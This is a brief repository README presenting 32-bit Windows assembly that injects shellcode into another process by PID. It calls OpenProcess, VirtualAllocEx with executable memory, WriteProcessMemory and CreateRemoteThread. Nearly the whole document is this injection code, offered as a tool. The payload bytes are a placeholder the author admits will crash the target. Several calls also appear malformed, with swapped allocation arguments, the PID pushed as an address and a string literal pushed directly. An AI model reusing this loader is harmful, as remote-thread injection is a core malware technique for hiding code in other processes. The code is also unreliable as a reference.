# x86-Shell-Code-Loader
Simple x86 script that injects shellcode via windows api, it's bad so it will not work on apps like discord or whatever 

# Script

```asm
section .data
    pid DWORD 13668
    PROCESS_ALL_ACCESS equ 0x1F0FFF
    PAGE_EXECUTE_READWRITE equ 0x40
    MEM_COMMIT equ 0x1000
    MEM_RESERVE equ 0x2000

    msg db 'Injected Shell Code Into Process', 0
    title db 'Success', 0
    fail db 'Failure', 0

    shellcode db 0x90, 0x90, 0x90, 0x90, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xD0 ; this isn't real shellcode so once it's injected if it even injects the process will most likely crash
    shellcode_len equ $ - shellcode

section .bss
    hproc resd 1
    shellcode_addr resd 1

section .text
    global _start

    extern OpenProcess@12
    extern VirtualAllocEx@20
    extern WriteProcessMemory@20
    extern CreateRemoteThread@24
    extern MessageBoxA@16
    extern ExitProcess@4
    extern GetLastError@0

_start:
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    push PROCESS_ALL_ACCESS
    push 0
    push pid
    call OpenProcess@12
    mov [hproc], eax

    test eax, eax
    jz error

    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    push MEM_COMMIT or MEM_RESERVE
    push PAGE_EXECUTE_READWRITE
    push 0
    push shellcode_len
    push [hproc]
    call VirtualAllocEx@20
    mov [shellcode_addr], eax

    test eax, eax
    jz error

    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    push 0
    push shellcode_len
    push shellcode
    push [shellcode_addr]
    push [hproc]
    call WriteProcessMemory@20

    test eax, eax
    jz error

    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    push 0
    push 0
    push [shellcode_addr]
    push 0
    push 0
    push [hproc]
    call CreateRemoteThread@24

    test eax, eax
    jz error


    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


    push 0
    push title
    push msg
    push 0
    call MessageBoxA@16

    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    push 0
    call ExitProcess@4

error:
    call GetLastError@0

    push 0
    push fail
    push 'Failed to inject shell code', 0
    push 0
    call MessageBoxA@16

    push 1
    call ExitProcess@4
```
